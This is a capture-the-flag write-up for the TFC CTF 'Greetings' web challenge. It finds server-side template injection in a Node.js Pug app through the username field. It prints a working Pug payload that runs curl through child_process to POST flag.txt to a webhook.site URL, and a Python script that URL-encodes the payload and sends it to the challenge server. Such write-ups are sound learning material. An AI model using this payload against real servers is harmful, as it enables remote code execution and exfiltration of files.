# TFC CTF WRITEUP
## GREETINGS
### Web Interface
We are provided with an input in the form of a username.

![Web Interface](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/web%20page.png?raw=true)

When we enter a username and press submit, the web page redirects to the result page and calls our name.

![Result Page](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/result%20page.png?raw=true)

After trying several attempts like XSS and SSTI, I discovered an SSTI vulnerability in Node.js PUG.

![SSTI Vulnerability](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/pug%20result%20page.png?raw=true)

### Exploitation

After conducting research on the internet, I found a payload that might be useful for further exploitation.

[https://exploit-notes.hdks.org/exploit/web/template-engine/pug-pentesting/](https://exploit-notes.hdks.org/exploit/web/template-engine/pug-pentesting/)

```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl -X POST -d @flag.txt https://webhook.site/d5de6476-d13e-41db-b66d-e27e414a7573')}()}
```

The code above will send the contents of `flag.txt` via a POST request to our webhook, and we can read the `flag` from the webhook.

### Exploit with Python Script

```python
import requests

url = "http://challs.tfcctf.com:31077/result?username="  # Target URL
webhook = "https://webhook.site/f372f484-9800-4196-87ce-c9d1bcd37ed5"  # Change this with your webhook
payload = """%23{function(){localLoad%3Dglobal.process.mainModule.constructor._load%3Bsh%3DlocalLoad(%22child_process%22).exec(%27curl+-X+POST+-d+%40flag.txt+""" + webhook.replace(":", "%3A").replace("/", "%2F") + """%27)}()}"""

full_url = url + payload
response = requests.get(full_url)

print(response.text)
```

---

![Evidence](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/evidence-greetings.png?raw=true)

---

Thank you <3.